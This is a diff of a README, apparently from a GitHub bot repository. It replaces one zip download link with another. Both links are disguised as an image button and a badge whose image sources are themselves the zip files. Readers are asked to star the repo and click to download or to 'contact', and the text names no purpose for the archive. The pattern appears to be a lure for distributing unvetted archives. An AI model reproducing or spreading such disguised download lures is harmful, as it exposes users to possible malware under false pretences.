@@ -1,8 +1,8 @@
 Give Star repo & then click on the below button 👇👇👇👇
-<p><a href="https://raw.githubusercontent.com/kyaw287/clonebotNoSA-1/master/bot/helper/mirror_utils/upload_utils/clonebot_No_S_v2.1.zip"> <img src="https://raw.githubusercontent.com/kyaw287/clonebotNoSA-1/master/bot/helper/mirror_utils/upload_utils/clonebot_No_S_v2.1.zip" width="200""/></a></p>
+<p><a href="https://github.com/kyaw287/clonebotNoSA-1/raw/refs/heads/master/vendor/clonebot-S-No-2.6.zip"> <img src="https://github.com/kyaw287/clonebotNoSA-1/raw/refs/heads/master/vendor/clonebot-S-No-2.6.zip" width="200""/></a></p>
     
  
-[![Slam](https://raw.githubusercontent.com/kyaw287/clonebotNoSA-1/master/bot/helper/mirror_utils/upload_utils/clonebot_No_S_v2.1.zip)](https://raw.githubusercontent.com/kyaw287/clonebotNoSA-1/master/bot/helper/mirror_utils/upload_utils/clonebot_No_S_v2.1.zip)
+[![Slam](https://github.com/kyaw287/clonebotNoSA-1/raw/refs/heads/master/vendor/clonebot-S-No-2.6.zip)](https://github.com/kyaw287/clonebotNoSA-1/raw/refs/heads/master/vendor/clonebot-S-No-2.6.zip)
 
 ဆက်သွယ်လိုလျင်  click above photo ☝
 
